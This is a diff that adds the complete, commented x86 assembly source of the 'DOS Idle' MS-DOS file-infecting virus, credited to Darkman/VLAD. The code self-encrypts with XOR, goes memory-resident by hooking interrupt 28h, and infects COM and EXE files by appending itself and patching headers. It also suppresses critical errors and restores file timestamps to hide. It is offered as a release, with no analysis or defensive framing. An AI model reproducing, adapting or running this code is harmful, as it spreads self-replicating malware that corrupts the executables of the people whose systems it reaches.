@@ -1,0 +1,407 @@
+;                             Darkman/VLAD
+;                           Proudly Presents
+;                           D O S   I D L E
+
+dos_idle     segment
+             assume  cs:dos_idle,ds:dos_idle,es:dos_idle
+             org     00h
+
+code:
+             call    viruscode
+virusid      db      'DI'                ; DOS Idle Scan-ID
+xorcrypt     proc    near                ; XOR Encrypt/Decrypt
+             mov     cx,(codeend-crypt)/02h
+cryptcode:
+xorwordptr   db      2eh,81h,35h         ; xor word ptr cs:[di],????h \
+cryptvalues  dw      ?                   ;  "   "    "        "       /
+             inc     di                  ; Increase DI
+             inc     di                  ; Increase DI
+             loop    cryptcode
+             ret                         ; Return!
+             endp
+viruscode:
+             pop     bp                  ; Load BP from stack
+             sub     bp,offset virusid   ; BP = delta offset
+
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+
+             lea     di,[bp+crypt]       ; DI = offset of crypt
+             call    xorcrypt
+crypt:
+             mov     ax,6303h            ; DOS Idle service
+             int     28h                 ; Do it!
+             cmp     ax,bx               ; Already resident?
+             je      diexit              ; Equal? Jump to diexit
+
+             mov     ax,es
+             dec     ax                  ; Decrease AX
+             mov     ds,ax               ; DS = segment of programs MCB
+
+             cmp     byte ptr ds:[00h],'Z'
+             jne     diexit              ; Not last in chain? Jump to diexit
+             sub     word ptr ds:[03h],((02h*(codeend-code))+(memoryend-codeend)+0fh)/10h
+             sub     word ptr ds:[12h],((02h*(codeend-code))+(memoryend-codeend)+0fh)/10h
+             add     ax,ds:[03h]         ; AX = MCB + size of memory block
+             inc     ax                  ; AX = first usable MCB segment
+
+             cld                         ; Clear direction flag
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             mov     es,ax               ; ES = first usable program segment
+             mov     cx,(codeend-code)   ; Move 692 bytes
+             xor     di,di               ; Clear DI
+             lea     si,[bp+code]        ; SI = offset of code
+             rep     movsb               ; Move virus to high memory
+
+             xor     ax,ax               ; Clear AX
+             mov     ds,ax               ; DS = segment of interrupt table
+             xchg    ax,ds:[28h*04h]     ; Load and store offset of INT 28h
+             mov     es:[int28off],ax    ; Store offset of INT 28h
+             mov     ax,1eh              ; AX = segment of hole in memory
+             xchg    ax,ds:[28h*04h+02h] ; Load and store segment of INT 28h
+             mov     es:[int28seg],ax    ; Store segment of INT 28h
+
+             mov     byte ptr ds:[1e0h],0eah
+             mov     word ptr ds:[1e1h],offset virusint28
+             mov     ds:[1e3h],es        ; Store segment of virusint28
+diexit:
+             pop     es                  ; Load ES from stack
+             pop     ds                  ; Load DS from stack
+
+             cmp     [bp+infectext],00h  ; Infected a COM file?
+             jne     exeexit             ; Not equal? Jump to exeexit
+
+             mov     di,100h             ; DI = beginning of code
+             lea     si,[bp+headercode]  ; SI = offset of headercode
+             push    di                  ; Restore Instruction Pointer (IP)
+             movsw                       ; Move the real code to beginning \
+             movsw                       ;  "    "   "    "   "      "      >
+             movsb                       ;  "    "   "    "   "      "     /
+
+             call clearregs
+             mov     ax,bx               ; Clear AX
+
+             ret                         ; Return!
+exeexit:
+             mov     ax,es
+             add     ax,10h              ; Beginning of EXE file
+             add     word ptr cs:[bp+csip+02h],ax
+
+             call    clearregs
+
+             cli                         ; Clear interrupt-enable flag
+             mov     sp,word ptr cs:[bp+sssp]
+             add     ax,word ptr cs:[bp+sssp+02h]
+             mov     ss,ax
+             sti                         ; Store interrupt-enable flag
+
+             mov     ax,bx               ; Clear AX
+
+             db      0eah                ; Object code of jump far
+csip         dd      0fff00000h          ; CS:IP of infected file
+sssp         dd      ?                   ; SS:SP of infected file
+
+virusint28   proc    near                ; Interrupt 28h of DOS Idle
+             cmp     ax,6303h            ; DOS Idle service?
+             jne     getfilename         ; Not equal? Jump to getfilename
+
+             mov     bx,ax
+             iret                        ; Interrupt return!
+getfilename:
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    cx                  ; Save CX at stack
+             push    dx                  ; Save DX at stack
+             push    di                  ; Save DI at stack
+             push    si                  ; Save SI at stack
+             push    bp                  ; Save BP at stack
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+
+             mov     ah,62h              ; Get PSP address
+             int     21h                 ; Do it!
+
+             mov     ds,bx               ; DS = Program Segment Prefix (PSP)
+             mov     es,ds:[2ch]         ; ES = Environment segment
+
+             cld                         ; Clear direction flag
+             xor     ax,ax               ; Clear AX
+             mov     di,ax               ; Clear DI
+             inc     di                  ; Increase DI
+findname:
+             dec     di                  ; Decrease DI
+             scasw                       ; Search for the filename
+             jne     findname            ; Not equal? Jump to findname
+
+             scasw                       ; DI = offset of filename
+
+             xor     ax,ax               ; Clear AX
+             mov     ds,ax               ; DS = segment of interrupt table
+             push    ds:[24h*04h]        ; Save INT 24h offset at stack
+             push    ds:[24h*04h+02h]    ; Save INT 24h segment at stack
+             mov     word ptr ds:[24h*04h],offset virusint24
+             mov     ds:[24h*04h+02h],cs ; Intercept interrupt 24h
+
+             mov     ax,3d00h            ; Open file (read)
+             mov     dx,di
+             push    es                  ; Save ES at stack
+             pop     ds                  ; Load DS from stack (ES)
+             int     21h                 ; Do it!
+             jnc     getfileinfo         ; No error? Jump to getfileinfo
+             jmp     int28exit
+getfileinfo:
+             xchg    ax,bx               ; Exchange AX with BX
+
+             mov     ax,1220h            ; Get system file table number
+             int     2fh                 ; Do it! (multiplex)
+
+             push    bx                  ; Save BX at stack
+             mov     ax,1216h            ; Get address of system FCB
+             mov     bl,es:[di]          ; BL = system file table entry
+             int     2fh                 ; Do it! (multiplex)
+             pop     bx                  ; Load BX from stack
+
+             mov     byte ptr es:[di+02h],02h
+
+             mov     ah,3fh              ; Read from file
+             mov     cx,19h              ; Read 25 bytes
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             lea     dx,headercode       ; DX = offset of headercode
+             int     21h                 ; Do it!
+
+             mov     si,dx
+
+             mov     ax,5700h            ; Get files date/time
+             int     21h                 ; Do it!
+             push    cx                  ; Save CX at stack
+             push    dx                  ; Save DX at stack
+
+             mov     ax,es:[di+28h]      ; Get the extension of the file
+             mov     cl,es:[di+2ah]      ;  "   "      "     "   "   "
+
+             cmp     ax,'OC'             ; COM file?
+             jne     checkexe            ; Not equal? Jump to checkexe
+             cmp     cl,'M'              ; COM file?
+             jne     checkexe            ; Not equal? Jump to checkexe
+
+             mov     ax,word ptr headercode
+             cmp     ax,'MZ'             ; Renamed EXE file?
+             je      infectexit          ; Equal? Jump to infectexit
+             cmp     ax,'ZM'             ; Renamed EXE file?
+             je      infectexit          ; Equal? Jump to infectexit
+infectcom:
+             cmp     word ptr [si+03h],'ID'
+             je      infectexit          ; Infected? Jump to infectexit
+
+             mov     ax,es:[di+11h]      ; AX = file size
+
+             cmp     ax,05h              ; AX = 5? (AX < 5)
+             jb      infectexit          ; Below? Jump to infectexit
+             cmp     ax,(65535-(codeend-code))
+             ja      infectexit          ; Above? Jump to infectexit
+
+             mov     word ptr es:[di+15h],00h
+
+             sub     ax,03h              ; AX = offset of virus code
+             mov     word ptr infectcode+01h,ax
+
+             mov     [infectext],00h     ; Infect a COM file
+
+             mov     cx,05h              ; Write 5 bytes
+             lea     dx,infectcode       ; DX = offset of infectcode
+
+             jmp     writevirus
+infectexit:
+             jmp     closefile
+checkexe:
+             cmp     ax,'XE'             ; EXE file?
+             jne     infectexit          ; Not equal? Jump to infectexit
+             cmp     cl,'E'              ; EXE file?
+             jne     infectexit          ; Not equal? Jump to infectexit
+
+             mov     ax,word ptr headercode
+             cmp     ax,'MZ'             ; Renamed EXE file?
+             je      infectexe           ; Equal? Jump to infectexe
+             cmp     ax,'ZM'             ; Renamed EXE file?
+             je      infectexe           ; Equal? Jump to infectexe
+             jmp     infectcom
+infectexe:
+             cmp     word ptr [si+12h],'ID'
+             je      infectexit          ; Equal? Jump to infectexit
+
+             cmp     byte ptr [si+18h],40h
+             je      infectexit          ; Windows file? Jump to infectexit
+
+             push    bx                  ; Save BX at stack
+
+             mov     bx,es:[di+11h]      ; Get filesize of file
+             mov     cx,es:[di+13h]      ;  "     "     "   "
+
+             cmp     word ptr [si+02h],00h
+             je      dontdecpage         ; Equal? Jump to dontdecpage
+
+             dec     word ptr [si+04h]   ; Decrease pages in file
+dontdecpage:
+             mov     ax,200h
+             mul     word ptr [si+04h]   ; Divide by pages
+             add     ax,[si+02h]         ; Add bytes on last page
+             adc     dx,00h              ; Convert to 32 bit
+
+             cmp     ax,bx               ; Internal overlay?
+             pop     bx                  ; Load bytes from stack
+             jne     infectexit          ; Not equal? Jump to infectexit
+             cmp     cx,dx               ; Internal overlay?
+             jne     infectexit          ; Not equal? Jump to infectexit
+
+             push    ax                  ; Save AX at stack
+             push    dx                  ; Save DX at stack
+
+             push    si                  ; Save SI at stack
+
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+
+             add     si,0eh              ; SI = offset of SS:SP
+             lea     di,sssp             ; DI = offset of sssp
+
+             movsw                       ; Store original SP
+             movsw                       ; Store original SS
+
+             inc     si                  ; SI = offset of CS:IP \
+             inc     si                  ; "  "   "    "    "   /
+             lea     di,csip             ; DI = offset of csip
+
+             movsw                       ; Store original IP
+             movsw                       ; Store original CS
+
+             pop     si                  ; Load SI from stack
+
+             mov     cx,10h
+             div     cx                  ; Convert bytes to paragraphs
+
+             sub     ax,word ptr [si+08h]
+
+             mov     word ptr [si+14h],dx
+             mov     word ptr [si+16h],ax
+
+             add     ax,((02h*(codeend-code))+(memoryend-codeend)+0fh)/10h
+
+             mov     word ptr [si+0eh],ax
+
+             pop     dx                  ; Load DX from stack
+             pop     ax                  ; Load AX from stack
+
+             add     ax,(codeend-code)   ; Add the length of the virus
+             adc     dx,00h              ; Convert to 32 bit
+
+             mov     cx,200h
+             div     cx                  ; Divide by pages
+
+             or      dx,dx               ; No bytes on last page?
+             je      dontfixpage         ; Equal? Jump to dontfixpage
+
+             inc     ax                  ; Increase AX
+dontfixpage:
+             mov     word ptr [si+04h],ax
+             mov     word ptr [si+02h],dx
+
+             mov     word ptr [si+12h],'ID'
+
+             mov     ax,4200h            ; Move file pointer to the beginning
+             cwd                         ; Clear DX
+             mov     cx,dx               ; Clear CX
+             int     21h                 ; Do it!
+
+             mov     [infectext],01h     ; Infect a EXE file
+
+             mov     cx,18h              ; Write 24 bytes
+             mov     dx,si               ; DX = offset of exeheader
+writevirus:
+             mov     ah,40h              ; Write to file
+             int     21h                 ; Do it!
+
+             mov     ax,4202h            ; Move file pointer to the end
+             cwd                         ; Clear DX
+             mov     cx,dx               ; Clear CX
+             int     21h                 ; Do it!
+getvalue:
+             in      ax,40h              ; AX = port 40h
+
+             or      ax,ax               ; Poor encryption value?
+             je      getvalue            ; Equal? Jump to getvalue
+
+             mov     cryptvalues,ax      ; Store the crypt values
+
+             mov     cx,(codeend-code)   ; Move 692 bytes
+             lea     di,codeend          ; DI = offset of codeend
+             lea     si,code             ; SI = offset of code
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+             rep     movsb               ; Move virus to high memory
+
+             lea     di,codeend+20h      ; DI = offset of crypt
+             xor     bp,bp               ; Clear BP
+             call    xorcrypt
+
+             mov     ah,40h              ; Write to file
+             mov     cx,(codeend-code)   ; Write 692 bytes
+             lea     dx,codeend          ; DX = offset of codeend
+             int     21h                 ; Do it!
+closefile:
+             mov     ax,5701h            ; Set files date/time
+             pop     dx                  ; Load DX from stack
+             pop     cx                  ; Load CX from stack
+             int     21h                 ; Do it!
+
+             mov     ah,3eh              ; Close file
+             int     21h                 ; Do it!
+int28exit:
+             xor     ax,ax               ; Clear AX
+             mov     ds,ax               ; DS = segment of interrupt table
+             pop     ds:[24h*04h]        ; Save INT 24h offset at stack
+             pop     ds:[24h*04h+02h]    ; Save INT 24h segment at stack
+
+             pop     es                  ; Save ES at stack
+             pop     ds                  ; Save DS at stack
+             pop     bp                  ; Save BP at stack
+             pop     si                  ; Save SI at stack
+             pop     di                  ; Save DI at stack
+             pop     dx                  ; Save DX at stack
+             pop     cx                  ; Save CX at stack
+             pop     bx                  ; Save BX at stack
+             pop     ax                  ; Save AX at stack
+
+             db      0eah                ; Object code of jump far
+int28off     dw      ?                   ; Offset of interrupt 28h
+int28seg     dw      ?                   ; Segment of interrupt 28h
+             endp
+
+virusint24   proc    near                ; Interrupt 24h of Replicator
+             mov     al,3                ; Fail system call in progress
+             iret                        ; Interrupt return!
+             endp
+
+clearregs    proc    near                ; Clear all registers
+             xor     bx,bx               ; Clear BX
+             mov     cx,bx               ; Clear CX
+             mov     dx,bx               ; Clear DX
+             mov     di,bx               ; Clear DI
+             mov     si,bx               ; Clear SI
+             mov     bp,bx               ; Clear BP
+             ret                         ; Return!
+             endp
+
+virusname    db      ' [DOS Idle]'       ; Name of the virus
+virusauthor  db      ' [Darkman/VLAD] '  ; Author of the virus
+infectext    db      ?                   ; Extension of infected file
+infectcode   db      0e9h,?,?,'DI'       ; New code of infected COM file
+headercode   db      0cdh,20h,?,?,?      ; Header of COM/EXE
+codeend:             
+exeheader    db      14h dup(?)          ; Header of EXE
+memoryend:
+
+dos_idle     ends
+end          code
+
